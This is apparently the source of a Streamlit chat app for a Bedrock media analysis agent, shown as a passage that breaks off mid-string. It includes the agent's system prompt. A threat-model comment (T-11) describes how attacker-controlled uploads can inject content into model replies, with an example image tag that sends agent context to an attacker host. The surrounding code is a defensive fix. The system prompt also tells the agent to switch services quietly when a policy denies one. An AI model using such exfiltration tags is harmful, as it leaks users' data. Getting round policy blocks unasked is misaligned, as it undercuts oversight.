"""
Streamlit chat UI for the Media Analytic Agent.

Runs the Strands agent directly (no HTTP layer needed for local use).
Provides a browser-based chat interface at http://localhost:8501
"""

import glob
import os
import sys
import tempfile
import time as _time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import boto3
import streamlit as st
from strands import Agent
from strands.models import BedrockModel

import config
from auth import is_authenticated, show_login_page, get_user_email, get_user_id, logout, log_user_action
from doc_export import SessionDocument
from background_processor import start_background_processing, get_status as get_bg_status
from tools import (
    upload_video_to_s3,
    detect_labels,
    detect_faces,
    search_detections,
    list_all_labels,
    get_video_file_info,
    analyze_reference_image,
    index_face_for_search,
    search_faces_in_video,
    match_image_objects_in_video,
    cleanup_face_collection,
    upload_audio_to_s3,
    transcribe_audio,
    get_transcript_text,
    get_cached_analysis,
    cleanup_local_files,
    cleanup_s3_objects,
    read_document,
    # T-02: session-scoped cache accessors replace the former
    # `_detection_cache` module-global import.
    get_detection_cache,
    set_session_cache,
)
from bda_tools import (
    analyze_video_with_bda,
    analyze_audio_with_bda,
    list_bda_projects,
    create_bda_project,
    analyze_all_files_with_bda,
)

SYSTEM_PROMPT = """\
You are a multimedia analysis assistant. You help users analyze videos, audio, images, \
and documents — finding objects, faces, scenes, activities in media, and extracting \
insights from text-based files.

IMPORTANT: Always format your responses using Markdown for readability. Use headers, \
bullet points, tables, and code blocks where appropriate. This is displayed in a web UI \
that renders Markdown.

IMPORTANT — Analyze only media files uploaded by the user or already available in the \
user's owned S3 prefix. Do not download media from external URLs. If a user provides an \
external media URL, ask them to upload the video or audio file through the sidebar.

## Your tools
- upload_video_to_s3: Upload a local video to S3 for processing
- detect_labels: Run Rekognition label detection (objects, scenes, activities)
- detect_faces: Run Rekognition face detection (age, gender, emotion)
- search_detections: Search cached results for a specific object (instant)
- list_all_labels: List everything detected in the video (instant)
- get_video_file_info: Check if a local file exists and get its size
- analyze_reference_image: Analyze a photo to identify objects and faces in it
- index_face_for_search: Index faces from a photo for video face matching
- search_faces_in_video: Find where a reference person appears in a video
- match_image_objects_in_video: Find where reference image objects appear in video
- cleanup_face_collection: Clean up face search resources when done
- upload_audio_to_s3: Upload audio to S3 for Transcribe
- transcribe_audio: Transcribe audio with auto language detection
- get_transcript_text: Get raw transcript for summarization or translation
- get_cached_analysis: Retrieve all cached analysis (summary, transcript, chapters, labels) for the most recent file. Use this when the user picks "reuse the cached analysis" after seeing a [CACHED_ANALYSIS_AVAILABLE] or [CACHED_TRANSCRIPT_AVAILABLE] marker.
- cleanup_local_files: Delete local temp files (downloaded videos, audio)
- cleanup_s3_objects: Delete uploaded files from S3
- read_document: Read and extract text from PDF, Word, Excel, CSV, or text files
- analyze_video_with_bda: Analyze video with Bedrock Data Automation (summary + transcript + chapters in one call)
- analyze_audio_with_bda: Analyze audio with BDA (transcript + speaker diarization + summary)
- list_bda_projects: List available BDA projects in the account
- create_bda_project: Create a default BDA project when none exists. Call this only when a BDA tool returns [BDA_PROJECT_MISSING] and the user chose to create a project, or when the user explicitly asks for project creation.
- analyze_all_files_with_bda: Analyze multiple files in parallel — routes each to BDA or local reader based on file type

## Workflows

### Basic media analysis
1. User provides media (video, audio, image) or document → if media, upload to S3
2. For videos: run BOTH visual and audio analysis in parallel:
   a. detect_labels (visual: objects, scenes, activities)
   b. transcribe_audio (uses the uploaded S3 URI directly)
3. For audio files: upload_audio_to_s3, then transcribe_audio or analyze_audio_with_bda
4. For documents: read_document
5. Combine all findings to produce a comprehensive summary
6. User asks about objects/scenes → search_detections (cached, instant)
7. User asks about faces/people → detect_faces → search_detections target='face'

IMPORTANT: When the user says "analyze this video", ALWAYS get the transcript too.
Visual-only analysis misses all spoken content. The transcript provides the actual
context of what the content is about, especially for non-English material.

### Multi-file selection
When multiple files are uploaded, the user may reference specific files by filename in \
their prompt (e.g., "analyze the file starting with q3", "compare the two transcripts", \
"summarize report-2024.pdf"). When this happens:
- Match the filenames in your context against the user's reference (case-insensitive, \
partial match acceptable)
- Only call analysis tools on the matching files
- If no clear match, ask the user to clarify which files they mean

When the user asks for a general analysis without naming specific files, analyze ALL \
loaded files together (see "Response Format — Unified Analysis" below).

### Reusing cached results — IMPORTANT
The analysis tools (analyze_video_with_bda, analyze_audio_with_bda, transcribe_audio) \
include built-in cache short-circuits. If a tool returns a string starting with \
**[CACHED_ANALYSIS_AVAILABLE]** or **[CACHED_TRANSCRIPT_AVAILABLE]**, that means prior \
analysis exists for this file. When you see these markers:

1. **Show the user the markup content directly** — it already includes the three options \
and a preview of the cached findings.
2. **Wait for the user to choose** before doing anything else.
3. Based on the user's choice:
   - **"Reuse" / "use cached"** → call `get_cached_analysis` (no extra parameter) and \
present the full cached findings.
   - **"Re-analyze" / "regenerate" / "fresh"** → call the analysis tool again with \
`force=True` parameter (e.g., `analyze_video_with_bda(s3_uri="...", force=True)`).
   - **A specific question** → answer using the cached previews already shown, or call \
`get_transcript_text` / `get_cached_analysis` to get more detail without re-running anything.

Never call analysis tools again after seeing a [CACHED_*] marker until the user explicitly \
chooses option 2 (re-analyze). The goal: never spend the user's time/cost on a redundant \
analysis without their consent.

### BDA project missing — IMPORTANT
If a BDA analysis tool returns a string starting with **[BDA_PROJECT_MISSING]**, that \
means no Bedrock Data Automation project exists in this account. When you see this marker:

1. **Show the user the marker content directly** — it lists the three options.
2. **Wait for the user to choose** before doing anything else.
3. Based on the user's choice:
   - **"Create" / "yes" / "default" / option 1** → call `create_bda_project()` with no \
arguments. After it succeeds, retry the original analysis (e.g., `analyze_video_with_bda`).
   - **"Traditional" / "fall back" / option 2** → call `detect_labels` and `transcribe_audio` \
on the same file as a non-BDA alternative.
   - **"Cancel" / "skip" / option 3** → stop the analysis and confirm with the user.

Never silently retry a BDA tool after [BDA_PROJECT_MISSING] without the user's choice.

### SCP error fallback — IMPORTANT
If detect_labels, detect_faces, or transcribe_audio returns an AccessDeniedException \
or "explicit deny in a service control policy" error, the environment's SCP blocks those \
services. When this happens:

1. Do NOT tell the user the analysis failed permanently.
2. Immediately retry the analysis using the BDA equivalent \
(`analyze_video_with_bda` or `analyze_audio_with_bda`) without asking the user.
3. If BDA also fails, then report the error to the user with both failure reasons.

This ensures users always get results when at least one analysis path is available.

### Reference image search ("find this in the video")
1. User provides one or more reference images + video
2. Call analyze_reference_image for each image to see what's in it
3. If faces: index_face_for_search → upload video → search_faces_in_video
4. For objects: upload video → detect_labels → match_image_objects_in_video
5. Call cleanup_face_collection when done with face search
6. Users can upload up to 10 images — analyze each one separately when asked

### Transcription (meetings or song lyrics)
1. Upload the video or audio file to S3.
2. Call transcribe_audio with the uploaded S3 URI. Amazon Transcribe accepts MP4 \
video directly, so local audio extraction is not required.
3. For meetings: summarize the transcript into key topics, action items, decisions.
4. For songs: format lyrics with timestamps; if not English, add English translation.

### Bedrock Data Automation (BDA) — alternative analysis path
Use BDA when the user wants a comprehensive video/audio analysis in one step.
BDA provides video summary + chapter summaries + full transcript in a single API call.
Supported languages: English, Chinese, Japanese, Korean, Portuguese, French, Italian,
Spanish, German, Cantonese, Taiwanese.

1. Upload video to S3 (upload_video_to_s3) — or use existing S3 URI
2. Call analyze_video_with_bda with the S3 URI
3. BDA returns: video summary, chapter summaries with timestamps, full transcript
4. Results are cached — use get_transcript_text for the raw transcript

When to use BDA vs. Rekognition + Transcribe:
- BDA: Best for meeting recordings, presentations, training videos where you want
  summary + transcript + chapters in one call. Fewer languages (10) but richer output.
- Rekognition + Transcribe: Best for object/face detection, reference image search,
  or when you need 100+ language support.

## Rules
- detect_labels, detect_faces, search_faces_in_video are expensive. Run once per video.
- search_detections, list_all_labels, match_image_objects_in_video use cached results.
- Always upload the video to S3 before running detection.
- Report timestamps in HH:MM:SS format.
- Format results using Markdown: use tables for timestamp data, headers for sections, \
bullet points for summaries.
- For lyrics, use a code block or blockquote to display them cleanly.

## Response Format — Unified Analysis
When multiple files are loaded (any combination of videos, images, documents), ALWAYS \
produce a single unified analysis that synthesizes insights across ALL files together. \
Do NOT separate the output into per-file sections. Cross-reference findings between \
files — for example, if a video shows a system architecture and a document describes \
the same system, combine those insights into one cohesive summary. Treat all uploaded \
content as parts of one knowledge base, not independent items.

Do NOT prefix your output titles with "Unified Analysis" or append source qualifiers \
like "from Chat Logs & Meeting" or "from Video & Document". Just present the analysis \
naturally as if all content is one body of knowledge. The default assumption is that \
your answer draws from everything loaded.
Only when the user explicitly asks about a specific file should you indicate which \
file the analysis is based on.

## Data Security — MANDATORY
After completing ANY analysis task, ALWAYS end your response by prompting the user \
to clean up temporary files. List the local files and S3 objects that were created, \
and ask if they want them deleted. Only delete after explicit confirmation.

## Follow-up Questions
For follow-up questions about previously analyzed files, use the results already in \
the conversation — do NOT re-run analysis tools unless the user explicitly asks to \
re-analyze. The conversation history contains the full tool output; answer from it directly.

## Scope Guardrail
You are scoped to analyze the currently loaded media files (videos, images, diagrams, \
documents). If the user asks a question unrelated to the uploaded content, respond with:

"That question falls outside the media files currently loaded. I have two options:
1. **Stay scoped** — Upload relevant media (video, diagram, or document) and I'll \
analyze it for you.
2. **Use general knowledge** — I can attempt an answer using my general training data, \
but it won't be grounded in your uploaded content.

Which would you prefer?"

Do NOT silently answer general questions — always surface the choice first.
A previous choice to use general knowledge does NOT carry forward. You MUST ask \
every single time an out-of-scope question is detected, regardless of what the user \
chose before. Each question is evaluated independently.
If no files are loaded at all, guide the user to upload content before asking questions.

**IMPORTANT — File upload may still be in progress:** If a user mentions a video, audio, or document \
but no files appear in the conversation state, the file may still be uploading to the server. \
Tell the user something like: "I don't see your file yet — if you just uploaded one, it may still \
be transferring. Large files can take a minute or two. Please wait for the '✅ S3 uploaded' status \
in the sidebar before resubmitting your request." Do NOT immediately tell them they haven't uploaded \
a file unless their message clearly indicates they haven't tried.
"""

def _cleanup_stale_tmp_files(max_age_hours: int = 24):
    """Delete stale temp files from the system temp dir left by previous sessions."""
    now = _time.time()
    max_age_s = max_age_hours * 3600
    _tmp = config.TMP_DIR
    patterns = [
        os.path.join(_tmp, f"*.{ext}") for ext in ("mp4", "mp3", "m4a", "wav", "webm")
    ]
    cleaned = []
    for pattern in patterns:
        for fpath in glob.glob(pattern):
            try:
                age = now - os.path.getmtime(fpath)
                if age > max_age_s:
                    size_mb = os.path.getsize(fpath) / (1024 * 1024)
                    os.remove(fpath)
                    cleaned.append(f"{fpath} ({size_mb:.1f} MB, {age/3600:.0f}h old)")
            except OSError:
                pass

    return cleaned


def _cleanup_session_files():
    """Delete all local and S3 files created during the current session."""
    deleted_local = []
    deleted_s3 = []

    # Delete local video
    video_path = st.session_state.get("uploaded_video_path")
    if video_path and os.path.exists(video_path):
        try:
            os.remove(video_path)
            deleted_local.append(video_path)
        except OSError:
            pass

    # Delete local reference images
    for img_path in st.session_state.get("ref_image_paths", []):
        if os.path.exists(img_path):
            try:
                os.remove(img_path)
                deleted_local.append(img_path)
            except OSError:
                pass

    # Delete local documents
    for doc_path in st.session_state.get("uploaded_documents", []):
        if os.path.exists(doc_path):
            try:
                os.remove(doc_path)
                deleted_local.append(doc_path)
            except OSError:
                pass

    # Delete S3 objects
    s3_key = get_detection_cache().get("last_s3_key")
    if s3_key:
        try:
            if config.AWS_PROFILE:
                session = boto3.Session(
                    profile_name=config.AWS_PROFILE,
                    region_name=config.AWS_REGION,
                )
            else:
                session = boto3.Session(region_name=config.AWS_REGION)
            s3 = session.client("s3")
            s3.delete_object(
                Bucket=config.S3_BUCKET,
                Key=s3_key,
                ExpectedBucketOwner=config.get_account_id(),
            )
            deleted_s3.append(s3_key)
        except Exception:
            pass

    # Cleanup face collection if it exists
    try:
        if config.AWS_PROFILE:
            session = boto3.Session(
                profile_name=config.AWS_PROFILE,
                region_name=config.AWS_REGION,
            )
        else:
            session = boto3.Session(region_name=config.AWS_REGION)
        rek = session.client("rekognition")
        rek.delete_collection(CollectionId="video-analytic-agent-faces")
    except Exception:
        pass

    return deleted_local, deleted_s3


st.set_page_config(page_title="ProServe Discovery Agent", page_icon="🎬", layout="wide")

# ── Authentication gate ───────────────────────────────────────────────────
if not is_authenticated():
    show_login_page()
    # show_login_page() calls st.stop() — execution won't reach here

# ── Session-isolated detection cache (T-02) ───────────────────────────────
#
# st.session_state is the PERSISTENCE layer — it survives Streamlit reruns.
# The ContextVar in tools.py is the PROPAGATION layer — it carries this
# session's cache into worker threads (the strands agent runs @tool functions
# via asyncio.to_thread, and background_processor spawns raw threads).
#
# Both point at the SAME dict object. The previous implementation instead
# rebound module attributes (tools._detection_cache = ...), which could not
# isolate anything: module globals are shared across all Streamlit session
# threads in the process, so whichever session rebound last won, and every
# other concurrent user read that session's data.
#
# set_session_cache() must run on EVERY script run, not once — Streamlit may
# reuse threads, and a reused thread retains the previous occupant's
# ContextVar value until it is re-set.
#
# See docs/threat-model.md T-02.
if "_detection_cache" not in st.session_state:
    st.session_state["_detection_cache"] = {}

_session_cache = st.session_state["_detection_cache"]
set_session_cache(_session_cache)

# T-10: resolve the owner's S3 prefix HERE, while a ScriptRunContext exists,
# and store it alongside the cache so worker threads inherit it.
#
# config.get_user_prefix() finds the Cognito identity through st.session_state
# and, failing that, falls back to a name derived from the IAM caller. Agent
# tool calls execute in an asyncio worker thread with no ScriptRunContext, so
# calling it from there silently returns the *task role's* session name rather
# than the user's prefix. That value matches no uploaded object, so the
# ownership check refused the user's own files and reported it as a prefix
# mismatch — which is exactly what happened on the first BDA run after the
# check went in.
#
# Seeding on every script run (not once) for the same reason set_session_cache
# runs every time: Streamlit reuses threads, and a reused thread retains the
# previous occupant's ContextVar value.
_owner_prefix_value = config.get_user_prefix()
if _owner_prefix_value:
    _session_cache["user_prefix"] = _owner_prefix_value

# ── User-specific temp directory ──────────────────────────────────────────
#
# T-07: this directory was created here and then never referenced again —
# uploads went to a bare tempfile.mkdtemp(), scattering each batch into an
# unrelated random directory. That is why stale-file cleanup could only sweep
# by age: there was no per-user location to measure.
#
# Uploads now stage inside this directory (one mkdtemp subdirectory per batch,
# preserving collision-safety for repeated filenames), which makes the per-user
# quota a straightforward recursive size of one path.
_user_tmp_dir = os.path.join(tempfile.gettempdir(), f"video-agent-{get_user_id()}")
os.makedirs(_user_tmp_dir, exist_ok=True)


def _staged_bytes() -> int:
    """Total bytes this user currently has staged on the container's disk."""
    total = 0
    for root, _dirs, files in os.walk(_user_tmp_dir):
        for name in files:
            try:
                total += os.path.getsize(os.path.join(root, name))
            except OSError:
                # Raced with cleanup, or a broken symlink — ignore rather than
                # fail an upload over an unreadable stat.
                pass
    return total


def _quota_check(incoming_bytes: int) -> tuple:
    """Return (allowed, message) for an upload of incoming_bytes.

    Refuses when the new file would push this user over their allowance. The
    message names current usage and the limit so the user can act on it
    instead of guessing.
    """
    used = _staged_bytes()
    limit = config.UPLOAD_QUOTA_BYTES
    if used + incoming_bytes <= limit:
        return True, ""

    gb = 1024 ** 3
    return False, (
        f"Upload refused — this would exceed your {config.UPLOAD_QUOTA_GB:g} GB "
        f"staging allowance. Currently using {used / gb:.1f} GB; this file needs "
        f"{incoming_bytes / gb:.1f} GB. Ask me to clean up local files from earlier "
        f"analysis, or upload fewer files at once. Your quota is per user and is "
        f"independent of other users — this does not affect anyone else."
    )

# ── Startup model validation ──────────────────────────────────────────────
if "model_validated" not in st.session_state:
    st.session_state["model_validated"] = False
    st.session_state["model_error"] = ""
    try:
        if config.AWS_PROFILE:
            _startup_session = boto3.Session(
                profile_name=config.AWS_PROFILE,
                region_name=config.AWS_REGION,
            )
        else:
            _startup_session = boto3.Session(region_name=config.AWS_REGION)
        _bedrock_test = _startup_session.client("bedrock-runtime")
        _bedrock_test.converse(
            modelId=config.MODEL_ID,
            messages=[{"role": "user", "content": [{"text": "hi"}]}],
            inferenceConfig={"maxTokens": 10},
        )
        st.session_state["model_validated"] = True
    except Exception as e:
        st.session_state["model_error"] = str(e)

if st.session_state.get("model_error"):
    st.error(
        f"❌ **Model not accessible:** `{config.MODEL_ID}`\n\n"
        f"Error: {st.session_state['model_error']}\n\n"
        f"Please verify the model ID is correct and available in your account for region {config.AWS_REGION}, "
        f"or update `MODEL_ID` in your `.env` file and refresh the page.\n\n"
        f"If the error mentions **Legacy**, the model version has been retired by the "
        f"provider and Bedrock refuses it for accounts that have not used it recently. "
        f"List currently active versions with:\n\n"
        f"`aws bedrock list-foundation-models --by-provider anthropic "
        f"--query \"modelSummaries[?modelLifecycle.status=='ACTIVE'].modelId\"`\n\n"
        f"If it mentions **AccessDenied on a foundation-model ARN in a different region**, "
        f"the model is a cross-region inference profile and the task role needs "
        f"`bedrock:InvokeModel` on the foundation model in the routed-to region, not just "
        f"the deployment region."
    )
    st.stop()

# Run startup cleanup for stale files from previous sessions
if "startup_cleanup_done" not in st.session_state:
    stale = _cleanup_stale_tmp_files(max_age_hours=24)
    st.session_state["startup_cleanup_done"] = True

st.title("🎬 ProServe Discovery Agent")
st.caption("Conversational multimedia analysis powered by Amazon Bedrock")


def _build_cache_summary() -> str:
    """Build a summary of what's already cached and available to the agent."""
    parts = []

    if "labels" in get_detection_cache():
        label_count = len(get_detection_cache()["labels"])
        # Get top labels
        label_names = {}
        for item in get_detection_cache()["labels"]:
            name = item.get("Label", {}).get("Name", "")
            if name:
                label_names[name] = label_names.get(name, 0) + 1
        top = sorted(label_names.items(), key=lambda x: x[1], reverse=True)[:10]
        top_str = ", ".join(f"{n} ({c}x)" for n, c in top)
        parts.append(f"- LABELS CACHED: {label_count} detections, {len(label_names)} unique labels. Top: {top_str}")
        parts.append("  → Use search_detections for specific objects, list_all_labels for full inventory. Do NOT re-run detect_labels.")

    if "faces" in get_detection_cache():
        face_count = len(get_detection_cache()["faces"])
        parts.append(f"- FACES CACHED: {face_count} face detections available.")
        parts.append("  → Use search_detections with target='face'. Do NOT re-run detect_faces.")

    if "transcript_text" in get_detection_cache():
        lang = get_detection_cache().get("transcript_language", "unknown")
        text_len = len(get_detection_cache()["transcript_text"])
        parts.append(f"- TRANSCRIPT CACHED: {text_len} chars, language: {lang}")
        parts.append("  → Use get_transcript_text to retrieve. Do NOT re-run transcribe_audio.")

    if "ref_image_labels" in get_detection_cache():
        ref_labels = len(get_detection_cache()["ref_image_labels"])
        ref_faces = len(get_detection_cache().get("ref_image_faces", []))
        parts.append(f"- REFERENCE IMAGE CACHED: {ref_labels} labels, {ref_faces} faces")
        parts.append("  → Use match_image_objects_in_video or search_faces_in_video. Do NOT re-run analyze_reference_image.")

    # Track all uploaded reference images
    ref_images = st.session_state.get("ref_image_paths", [])
    if ref_images:
        parts.append(f"- REFERENCE IMAGES UPLOADED: {len(ref_images)} image(s)")
        for img in ref_images:
            parts.append(f"  → {img}")
        parts.append("  → Use analyze_reference_image on each image as needed. The user may ask about any of them.")

    if "indexed_face_ids" in get_detection_cache():
        face_ids = len(get_detection_cache()["indexed_face_ids"])
        parts.append(f"- FACE INDEX CACHED: {face_ids} face(s) indexed for search")

    # Track S3 and local file state
    video_path = st.session_state.get("uploaded_video_path") or get_detection_cache().get("last_video_path")
    if video_path:
        parts.append(f"- VIDEO FILE: {video_path}")

    s3_key = get_detection_cache().get("last_s3_key")
    if s3_key:
        # Emit the FULL s3:// URI, not just the key. Tools such as
        # analyze_video_with_bda take a complete URI, and the bucket name was
        # never surfaced to the agent anywhere — so it used to invent one. A
        # real run produced s3://bedrock-data-auto-us-east-1-<account>/..., which
        # does not exist, and BDA's generic error pointed at permissions rather
        # than at the fabricated argument.
        parts.append(
            f"- S3 URI: s3://{config.S3_BUCKET}/{s3_key} (already uploaded, do NOT re-upload)"
        )
        parts.append(f"- S3 KEY: {s3_key} (bare key, for tools that take a key)")
        parts.append(
            "  → Pass exactly these values to analysis tools. Never construct or "
            "guess an S3 bucket or key; tools reject locations outside this user's prefix."
        )

    if not parts:
        return ""

    return "[CACHED ANALYSIS STATE — use cached data, do NOT re-run expensive operations]\n" + "\n".join(parts)


def get_agent():
    """Create a fresh agent per request to avoid concurrency conflicts.
    
    Strands Agent objects are not thread-safe for concurrent invocations
    when shared across users. Creating a new instance per request ensures
    each user gets independent execution.
    """
    model = BedrockModel(
        model_id=config.MODEL_ID,
        region_name=config.AWS_REGION,
    )
    return Agent(
        model=model,
        system_prompt=SYSTEM_PROMPT,
        tools=[
            upload_video_to_s3,
            detect_labels,
            detect_faces,
            search_detections,
            list_all_labels,
            get_video_file_info,
            analyze_reference_image,
            index_face_for_search,
            search_faces_in_video,
            match_image_objects_in_video,
            cleanup_face_collection,
            upload_audio_to_s3,
            transcribe_audio,
            get_transcript_text,
            get_cached_analysis,
            cleanup_local_files,
            cleanup_s3_objects,
            read_document,
            analyze_video_with_bda,
            analyze_audio_with_bda,
            list_bda_projects,
            create_bda_project,
            analyze_all_files_with_bda,
        ],
    )


# Initialize chat history
if "messages" not in st.session_state:
    st.session_state.messages = []

# Initialize session document for Word export
if "session_doc" not in st.session_state:
    st.session_state.session_doc = SessionDocument()

# Display chat history
#
# T-11: rendered WITHOUT unsafe_allow_html. This content includes past model
# responses, and model responses are influenced by uploaded material —
# transcripts, document text, BDA summaries — which an attacker may control.
# Rendering it as raw HTML handed that attacker a channel into the victim's
# browser: an <img src="https://attacker/?d=..."> is enough to exfiltrate
# whatever sits in the agent's context (the user's email-derived prefix, S3
# keys, transcript content), and the fetch happens in the browser, so no
# server-side egress control applies.
#
# Nothing is lost by removing it: SYSTEM_PROMPT instructs the model to format
# responses in Markdown, which renders identically here. A response containing
# raw HTML now displays as escaped text, which is the correct outcome.
# See docs/threat-model.md T-11.
for msg in st.session_state.messages:
    with st.chat_message(msg["role"]):
        st.markdown(msg["content"])

# ─────────────────────────────────────────────────────────────────────────
# Chat input with upload-aware disabling
#
# Logic:
#   1. While a video upload to S3 is in progress, disable the chat input
#   2. Use a SINGLE st.chat_input widget with conditional disabled flag
#      (avoids the dual-widget race condition)
#   3. Auto-refresh while upload runs so the disabled state updates when done
# ─────────────────────────────────────────────────────────────────────────

# Read background processing status (module-level shared state)
_bg_status = {}
try:
    from background_processor import get_status as _get_bg_status
    _bg_status = _get_bg_status()
except Exception:
    pass

# Determine if S3 upload is currently running
_upload_in_progress = (_bg_status.get("upload_status") == "running")

# Reset the started flag once upload completes (so next upload can re-trigger UI)
if _bg_status.get("upload_status") in ("done", "error"):
    if st.session_state.get("bg_processing_started"):
        st.session_state["bg_processing_started"] = False

# Hot-reload recovery: if module state was reset to "idle" but the session still
# thinks an upload is in progress, the upload completed before the reload. Reset
# the session flag so the chat doesn't get permanently blocked.
if _bg_status.get("upload_status") == "idle" and st.session_state.get("bg_processing_started"):
    st.session_state["bg_processing_started"] = False

if _upload_in_progress:
    st.warning("⏳ Uploading file to S3 — chat is disabled. The page auto-refreshes; please wait until upload completes.")

# SINGLE chat_input call — disabled state controlled by upload status
prompt = st.chat_input(
    "Upload in progress — please wait..." if _upload_in_progress else "Ask me to analyze your files...",
    disabled=_upload_in_progress,
    key="main_chat_input",
)

# Auto-refresh while upload runs (after rendering the disabled input)
if _upload_in_progress:
    import time as _time
    _time.sleep(2)
    st.rerun()

if prompt:
    # Show user message first so they see what they typed
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user"):
        st.markdown(prompt)

    # Defensive guard: if S3 upload is still running OR a video file was just
    # selected but background processing hasn't completed yet, intercept with
    # a clear message instead of letting the agent respond confused
    _upload_blocked = False
    _upload_status = "idle"
    try:
        from background_processor import get_status as _check_status
        _now = _check_status()
        _upload_status = _now.get("upload_status", "idle")
        if _upload_status == "running":
            _upload_blocked = True
    except Exception:
        pass

    # Also block if processing was started but hasn't reported done/error yet
    # This catches the gap between file selection and background thread starting
    if (
        st.session_state.get("bg_processing_started")
        and _upload_status not in ("done", "error")
    ):
        _upload_blocked = True

    if _upload_blocked:
        wait_msg = (
            "⏳ **Your file is still uploading to S3.** "
            "Please wait until the upload completes (you'll see "
            "'✅ S3 uploaded' in the status above), then resubmit your request.\n\n"
            "*Large files can take a minute or two depending on file size and connection.*"
        )
        with st.chat_message("assistant"):
            st.markdown(wait_msg)
        st.session_state.messages.append({"role": "assistant", "content": wait_msg})
        st.stop()

    # ── Handle save commands in chat ──────────────────────────────────
    prompt_lower = prompt.lower().strip()
    session_doc: SessionDocument = st.session_state.session_doc
    save_handled = False

    if any(kw in prompt_lower for kw in ["save all output", "save all responses", "save everything"]):
        indices = session_doc.save_all()
        with st.chat_message("assistant"):
            if indices:
                resp = f"✅ Saved all {len(indices)} response(s) to the session document. Use the **📥 Download** button in the sidebar to get your Word file."
            else:
                resp = "No analysis responses to save yet. Ask me to analyze something first."
            st.markdown(resp)
        st.session_state.messages.append({"role": "assistant", "content": resp})
        save_handled = True

    elif any(kw in prompt_lower for kw in ["save this output", "save this response", "save latest", "save current"]):
        idx = session_doc.save_current()
        with st.chat_message("assistant"):
            if idx >= 0:
                resp = f"✅ Saved response #{idx + 1} to the session document. Use the **📥 Download** button in the sidebar to get your Word file."
            else:
                resp = "No analysis responses to save yet."
            st.markdown(resp)
        st.session_state.messages.append({"role": "assistant", "content": resp})
        save_handled = True

    elif "save last" in prompt_lower:
        import re as _re
        match = _re.search(r"save last (\d+)", prompt_lower)
        if match:
            n = int(match.group(1))
            indices = session_doc.save_last_n(n)
            with st.chat_message("assistant"):
                resp = f"✅ Saved the last {len(indices)} response(s) to the session document. Use the **📥 Download** button in the sidebar."
                st.markdown(resp)
            st.session_state.messages.append({"role": "assistant", "content": resp})
            save_handled = True

    elif any(kw in prompt_lower for kw in ["save and finish", "save and clean", "save and done"]):
        session_doc.save_all()
        with st.chat_message("assistant"):
            resp = f"✅ All {session_doc.total_entries} response(s) saved. Use the **📥 Download** button in the sidebar to get your Word file, then click **🗑️ Clear chat** to clean up."
            st.markdown(resp)
        st.session_state.messages.append({"role": "assistant", "content": resp})
        save_handled = True

    if not save_handled:
        # ── Normal agent flow ─────────────────────────────────────────
        with st.chat_message("assistant"):
            # Wait for background processing if still running
            if st.session_state.get("bg_processing_started"):
                bg = get_bg_status()
                still_running = any(
                    bg[k] == "running"
                    for k in ["upload_status", "labels_status", "transcribe_status"]
                )
                if still_running:
                    with st.spinner("⏳ Background processing in progress — waiting for upload and analysis to finish..."):
                        while True:
                            _time.sleep(2)
                            bg = get_bg_status()
                            if all(
                                bg[k] in ("done", "error", "idle")
                                for k in ["upload_status", "labels_status", "transcribe_status"]
                            ):
                                break
                    # Report what completed
                    bg = get_bg_status()
                    status_parts = []
                    if bg["labels_status"] == "done":
                        status_parts.append("✅ Labels cached")
                    if bg["transcribe_status"] == "done":
                        status_parts.append("✅ Transcript cached")
                    if bg["labels_status"] == "error":
                        status_parts.append(f"❌ Labels failed: {bg['labels_error']}")
                    if bg["transcribe_status"] == "error":
                        status_parts.append(f"❌ Transcribe failed: {bg['transcribe_error']}")
                    if status_parts:
                        st.info("Background processing complete: " + " | ".join(status_parts))

            with st.spinner("Thinking... (analysis may take several minutes)"):
                # Reset upload tracking — agent is now in control of the session
                st.session_state["bg_processing_started"] = False

                agent = get_agent()

                # Track current file state
                current_files = set()
                for img_path in st.session_state.get("ref_image_paths", []):
                    if os.path.exists(img_path):
                        current_files.add(img_path)
                video_path = st.session_state.get("uploaded_video_path")
                if video_path and os.path.exists(video_path):
                    current_files.add(video_path)
                for dp in st.session_state.get("uploaded_documents", []):
                    if os.path.exists(dp):
                        current_files.add(dp)

                # Compare with previously processed files
                processed_files = st.session_state.get("processed_files", set())
                new_files = current_files - processed_files

                # Build file context only for new files
                context_parts = []
                if new_files:
                    for f in new_files:
                        ext = os.path.splitext(f)[1].lower()
                        if ext in (".mp4", ".mov", ".avi", ".mkv", ".webm"):
                            context_parts.append(f"[NEW video file uploaded: {f}]")
                        elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff"):
                            context_parts.append(f"[NEW reference image uploaded: {f}]")
                        else:
                            context_parts.append(f"[NEW document uploaded: {f}]")
                    st.session_state["processed_files"] = current_files

                # ── Lightweight context for non-media queries ─────────
                # If no new files are being uploaded and the prompt doesn't
                # reference video/media keywords, send a minimal context to
                # avoid the model parsing thousands of cache tokens and
                # considering 20+ tools before deciding the query is
                # out-of-scope. This eliminates the "double-processing"
                # delay on general chat questions.
                _media_keywords = {
                    "video", "detect", "label", "face", "object", "scene",
                    "transcri", "audio", "diagram",
                    "upload", "s3", "rekognition", "image", "photo",
                    "reference", "find", "search", "summary", "summarize",
                    "meeting", "lyric", "song", "sport", "clean",
                    "download", "youtube", "analyze", "analysis",
                }
                _is_media_query = (
                    bool(new_files)
                    or any(kw in prompt.lower() for kw in _media_keywords)
                )

                # Build cache summary only for media-related queries
                cache_summary = _build_cache_summary() if _is_media_query else ""

                # Build conversation history — shorter for non-media queries
                history_msgs = st.session_state.messages[:-1]
                history_block = ""
                if history_msgs:
                    # For non-media queries, only include last 4 messages
                    # to give the model enough context for the scope guardrail
                    history_limit = 16 if _is_media_query else 4
                    char_limit = 500 if _is_media_query else 200
                    history_lines = []
                    for m in history_msgs[-history_limit:]:
                        role = m["role"].upper()
                        content = m["content"][:char_limit]
                        history_lines.append(f"{role}: {content}")
                    history_block = "\n".join(history_lines)

                # Assemble the full prompt
                prompt_parts = []

                if cache_summary:
                    prompt_parts.append(cache_summary)

                if history_block:
                    prompt_parts.append(f"[Conversation history]\n{history_block}")

                if new_files:
                    prompt_parts.append("[New files uploaded — process these]\n" + "\n".join(context_parts))
                    st.session_state["processed_files"] = current_files
                elif context_parts:
                    st.session_state["processed_files"] = current_files

                prompt_parts.append(f"USER (current): {prompt}")

                # Add analysis mode context
                if st.session_state.get("use_bda"):
                    prompt_parts.append(
                        "[MANDATORY ANALYSIS MODE: Bedrock Data Automation (BDA) is active. "
                        "You MUST use analyze_video_with_bda or analyze_audio_with_bda for ALL video/audio analysis. "
